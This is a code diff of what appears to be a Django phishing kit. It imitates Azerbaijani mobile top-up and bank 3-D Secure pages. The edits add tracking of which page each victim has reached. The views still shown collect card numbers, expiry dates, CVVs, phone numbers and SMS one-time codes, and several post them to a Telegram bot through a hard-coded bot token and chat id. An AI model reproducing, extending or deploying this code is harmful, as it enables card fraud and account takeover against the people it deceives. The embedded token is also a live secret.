@@ -54,6 +54,7 @@ def naxtel(request):
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
+        contact.page_name="/info"
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
@@ -85,6 +86,7 @@ def azercell(request):
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
+        contact.page_name="/info"
         print(contact.id)
         request.session['operator'] = operator
         request.session['phone'] = number
@@ -104,6 +106,7 @@ def bakcell(request):
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
+        contact.page_name="/info"
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
@@ -143,6 +146,7 @@ def info(request):
         contact.cvv = cvv_
         contact.bankname=""
         contact.save()
+        contact.page_name="/master.html"
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:master\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
         context = {
                 'id':contact.id,
@@ -181,12 +185,12 @@ def kapital(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
     contact.bankname=""
+    contact.page_name="/Kapital"
     contact.save()
     contex = {
         'last_contact_id': contact.id,
         "amount":contact.amount,
         "display":contact.hidden_type
-        
     }
     return render(request, "pages/kapital.html",contex)
 
@@ -395,6 +399,8 @@ def abb(request):
     'cc': contact.cc[-4:],
     "display":contact.hidden_type
     }
+    contact.page_name="/abb3d"
+    contact.save()
     print(context)
     return render( request,'pages/abb3d.html' ,context)
 
@@ -418,6 +424,7 @@ def dsecazericard(request):
         }
         contact.bankname=""
         contact.save()
+        contact.page_name="/loading"
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
 
         return render( request,'pages/loading.html',context )
@@ -445,10 +452,12 @@ def dseckapital(request):
         concatenated = input1 + input2+input3+input4
         contact.sms=concatenated
         contact.bankname=""
+        contact.page_name="/loading"
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
-    
+    contact.page_name="/loading"
+    contact.save()
     return render( request,'pages/loading.html',context )
 
 @ensure_csrf_cookie
@@ -463,6 +472,8 @@ def leobank3d(request):
     'cc': contact.cc[-4:],
     "display":contact.hidden_type
     }
+    contact.page_name="/error"
+    contact.save()
     return render( request,'pages/error.html',context )
 
 @ensure_csrf_cookie
@@ -471,6 +482,7 @@ def unibank(request):
     contact = ContactModel.objects.get(id=contact_id)
     number = str(contact.phone)
     contact.bankname=""
+    contact.page_name="/unibank3d"
     contact.save()
     context = {
         'number': number[-4:],
@@ -489,14 +501,18 @@ def unibank3d(request):
     contact = ContactModel.objects.get(id=contact_id)
     contact.sms=sms
     contact.bankname=""
+    contact.page_name="/loading"
     contact.save()
     context = {
         'last_contact_id': contact.id,
         "display":contact.hidden_type
     }
+    
     if len(sms) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
+        contact.page_name="/unibank3d"
+        contact.save()
         return render(request, 'pages/unibank3d.html')
     response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}')
     return render( request,'pages/loading.html',context )
@@ -515,6 +531,8 @@ def pashabank(request):
         'cc': contact.cc[-4:],
         "display":contact.hidden_type
     }
+    contact.page_name="/pasha"
+    contact.save()
     return render( request,'pages/pasha.html',context )
 
 
@@ -553,10 +571,12 @@ def pashabank3d(request):
         contact = ContactModel.objects.latest('created_at')
         contact.sms=concatenated
         contact.bankname=""
+        contact.page_name="/loading"
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:loading\n Number{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
-    
+    contact.page_name="/loading"
+    contact.save()
     return render( request,'pages/loading.html',context )
 
 
